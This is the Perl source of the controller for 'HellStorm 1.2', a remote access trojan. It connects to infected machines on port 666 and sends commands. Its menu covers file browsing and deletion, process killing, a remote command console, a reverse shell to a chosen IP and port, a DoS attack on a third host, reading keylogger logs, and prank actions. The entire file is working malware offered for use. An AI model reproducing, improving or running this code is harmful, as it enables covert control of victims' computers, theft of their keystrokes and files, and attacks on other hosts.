#!usr/bin/perl
#Project HellStorm 1.2
#(C) Doddy Hackman 2015

use IO::Socket;
use Cwd;

&menu;

# Functions

sub clean {
    my $os = $^O;
    if ( $os =~ /Win32/ig ) {
        system("cls");
    }
    else {
        system("clear");
    }
}

sub head {

    clean();

    print "\n\n-- == HellStorm 1.2 (C) Doddy Hackman 2015 == --\n\n\n";

}

sub menu {

    &head;

    print "[+] Target : ";
    chomp( my $ip = <STDIN> );

    my $socket = new IO::Socket::INET(
        PeerAddr => $ip,
        PeerPort => 666,
        Proto    => 'tcp',
        Timeout  => 5
    );

    if ($socket) {
        $socket->close;
        &menuo($ip);
    }
    else {
        print "\n\n[-] Server not infected\n";
        <STDIN>;
        &menu;
    }

}

sub menuo {

    &head;

    print "[$_[0]] : Online\n\n";
    print q(
1 : Information
2 : Files Manager
3 : Open CD
4 : Close CD
5 : Talk
6 : Message
7 : Console
8 : Hide taskbar
9 : Show taskbar
10 : Hide Icons
11 : Show Icons
12 : Process Manager
13 : Reverse Shell
14 : DOS Attack
15 : Change Wallpaper
16 : Word Writer
17 : Move Mouse
18 : See logs keylogger
19 : Change target
20 : Exit


);
    print "[Option] : ";
    chomp( my $opcion = <STDIN> );

    if ( $opcion eq 1 ) {
        print "\n\n[+] Information\n\n";
        $re = daryrecibir( $_[0], "infor" );
        if ( $re =~ /:(.*):(.*):(.*):(.*):(.*):/ ) {
            print "[+] Domain : $1\n";
            print "[+] Chip : $2\n";
            print "[+] Version : $3\n";
            print "[+] Username : $4\n";
            print "[+] OS : $5\n";
            print "\n[+] Press any key to continue\n";
            <stdin>;
        }
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 2 ) {

      menu1:
        print "\n\n[+] Files Manager\n\n";
        $cwd = daryrecibir( $_[0], "getcwd" . "\r\n" );
        show( $_[0], "/" );
        &menu2;

        sub menu2 {
            print "\n\n[Options]\n\n";
            print "1 - Change directory\n";
            print "2 - Rename\n";
            print "3 - Delete File\n";
            print "4 - Delete Directory\n";
            print "5 - Return to menu\n\n";
            print "[Opcion] : ";
            chomp( my $op = <stdin> );

            if ( $op eq 1 ) {
                print "\n\n[+] Directory : ";
                chomp( my $dir = <stdin> );
                $ver = daryrecibir( $_[0], "chdirnow K0BRA" . $dir . "K0BRA" );
                if ( $ver =~ /ok/ig ) {
                    print "\n\n[+] Directory changed\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                    <stdin>;
                }
                show( $_[0], $dir );
                &menu2;
                print "\n[+] Press any key to continue\n";
                <stdin>;
            }

            elsif ( $op eq 2 ) {
                print "\n\n[+] Name : ";
                chomp( my $old = <stdin> );
                print "\n\n[+] New name : ";
                chomp( my $new = <stdin> );
                $re = daryrecibir( $_[0], "rename :$old:$new:" );
                if ( $re =~ /ok/ ) {
                    print "\n\n[+] File renamed\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
                print "\n[+] Press any key to continue\n";
                <stdin>;
            }

            elsif ( $op eq 3 ) {
                print "\n\n[+] File to delete : ";
                chomp( my $file = <stdin> );
                $re =
                  daryrecibir( $_[0], "borrarfile K0BRA" . $file . "K0BRA" );
                if ( $re =~ /ok/ ) {
                    print "\n\n[+] File deleted\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
                print "\n[+] Press any key to continue\n";
                <stdin>;
            }

            elsif ( $op eq 4 ) {
                print "\n\n[+] Directory to delete : ";
                chomp( my $file = <stdin> );
                $re = daryrecibir( $_[0], "borrardir K0BRA" . $file . "K0BRA" );
                if ( $re =~ /ok/ ) {
                    print "\n\n[+] Directory deleted\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
                print "\n[+] Press any key to continue\n";
                <stdin>;
            }

            elsif ( $op eq 5 ) {
                &menuo( $_[0] );

            }
            else {
                show( $_[0], "/" );
            }
            goto menu1;
        }
    }

    elsif ( $opcion eq 3 ) {
        daryrecibir( $_[0], "opencd" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }

    elsif ( $opcion eq 4 ) {
        daryrecibir( $_[0], "closedcd" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }

    elsif ( $opcion eq 5 ) {
        print "\n\n[+] Talk : ";
        chomp( my $talk = <stdin> );
        $re = daryrecibir( $_[0], "speak :$talk:" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }

    elsif ( $opcion eq 6 ) {
        print "\n[+] Message : ";
        chomp( my $msg = <stdin> );
        daryrecibir( $_[0], "msgbox $msg" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 7 ) {

      menu:

        my $cmd, $re;

        print "\n\n>";

        chomp( my $cmd = <stdin> );

        if ( $cmd =~ /exit/ig ) {
            print "\n[+] Press any key to continue\n";
            <stdin>;
            &menuo( $_[0] );
        }

        $re = daryrecibir( $_[0], "comando :$cmd:" );
        print "\n" . $re;
        goto menu;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 8 ) {
        daryrecibir( $_[0], "iniciochau" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 9 ) {
        daryrecibir( $_[0], "iniciovuelve" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 10 ) {
        daryrecibir( $_[0], "iconochau" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 11 ) {
        daryrecibir( $_[0], "iconovuelve" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }

    elsif ( $opcion eq 12 ) {

        &reload( $_[0] );

        sub reload {

            my @pro;
            my @pids;

            my $sockex = new IO::Socket::INET(
                PeerAddr => $_[0],
                PeerPort => 666,
                Proto    => 'tcp',
                Timeout  => 5
            );

            print $sockex "mostrarpro" . "\r\n";
            $sockex->read( $re, 5000 );
            $sockex->close;

            chomp $re;

            print "\n\n[+] Process Found\n\n";

            while ( $re =~ /PROXEC(.*?)PROXEC/ig ) {
                if ( $1 ne "" ) {
                    push( @pro, $1 );
                }
            }

            while ( $re =~ /PIDX(.*?)PIDX/ig ) {
                if ( $1 ne "" ) {
                    push( @pids, $1 );
                }
            }

            $cantidad = int(@pro);

            for my $num ( 1 .. $cantidad ) {
                if ( $pro[$num] ne "" ) {
                    print "\n[+] Process : " . $pro[$num] . "\n";
                    print "[+] PID : " . $pids[$num] . "\n";
                }
            }

            print q(

[Options]


1 - Refresh list
2 - Close process
3 - Return to menu
 
);

            print "\n[Option] :  ";
            chomp( my $opc = <stdin> );

            if ( $opc =~ /1/ig ) {
                &reload( $_[0] );
            }
            elsif ( $opc =~ /2/ig ) {
                print "\n[+] Write the name of the process : ";
                chomp( my $numb = <stdin> );
                print "\n[+] Write the PID of the process : ";
                chomp( my $pid = <stdin> );
                $re = daryrecibir( $_[0],
                    "chauproce K0BRA" . $pid . "K0BRA" . $numb . "K0BRA" );
                if ( $re =~ /ok/ig ) {
                    print "\n\n[+] Proceso killed\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
                print "\n[+] Press any key to continue\n";
                <stdin>;
                &reload( $_[0] );
            }
            elsif ( $opc =~ /3/ig ) {
                print "\n[+] Press any key to continue\n";
                <stdin>;
                &menuo( $_[0] );
            }
            else {
                &reload;
            }
        }
    }

    elsif ( $opcion eq 13 ) {
        print "\n\n[+] IP : ";
        chomp( my $ip = <stdin> );
        print "\n\n[+] Port : ";
        chomp( my $port = <stdin> );
        print "\n\n[+] Connected !!!\n\n";
        $re = daryrecibir( $_[0], "backshell :$ip:$port:" );
    }
    elsif ( $opcion eq 14 ) {
        print "\n\n[+] IP : ";
        chomp( my $ipx = <stdin> );
        print "\n\n[+] Port : ";
        chomp( my $por = <stdin> );
        print "\n\n[+] Count : ";
        chomp( my $count = <stdin> );
        print "\n\n[+] Command Send !!!!\n\n";
        daryrecibir( $_[0], "dosattack :$ipx:$por:$count:" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 15 ) {
        print "\n\n[+] Image with format BMP : ";
        chomp( my $id = <stdin> );
        daryrecibir( $_[0], "cambiarfondo $id" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 16 ) {
        print "\n\n[+] Text : ";
        chomp( my $tx = <stdin> );
        daryrecibir( $_[0], "word :$tx:" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 17 ) {
        daryrecibir( $_[0], "crazymouse" );
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 18 ) {
        print "\n\n[Logs]\n\n";
        $re = daryrecibir( $_[0], "verlogs" );
        print $re. "\n\n";
        print "\n[+] Press any key to continue\n";
        <stdin>;
        &menuo( $_[0] );
    }
    elsif ( $opcion eq 19 ) {
        &menu;
    }
    elsif ( $opcion eq 20 ) {
        print "\n[+] Press any key to continue\n";
        <stdin>;
        exit 1;
    }
    else {
        &menuo;
    }
}

sub daryrecibir {

    my $sockex = new IO::Socket::INET(
        PeerAddr => $_[0],
        PeerPort => 666,
        Proto    => 'tcp',
        Timeout  => 5
    );

    print $sockex $_[1] . "\r\n";
    $sockex->read( $re, 5000 );
    $sockex->close;
    return $re . "\r";
}

sub show {

    my $re = daryrecibir( $_[0], "getcwd" . "\r\n" );
    print "\n\n[+] Directory : $re\n\n";
    $re1 = daryrecibir( $_[0], "dirnow ACATOY" . $re . "ACATOY" . "\r\n" );
    print "\n\n[Directories found]\n\n";
    while ( $re1 =~ /DIREX(.*?)DIREX/ig ) {
        if ( $1 ne "" ) {
            print "[+] $1\n";
        }
    }

    print "\n\n[Files found]\n\n";

    while ( $re1 =~ /FILEX(.*?)FILEX/ig ) {
        if ( $1 ne "" ) {
            print "[+] $1\n";
        }
    }

}

#The End ?
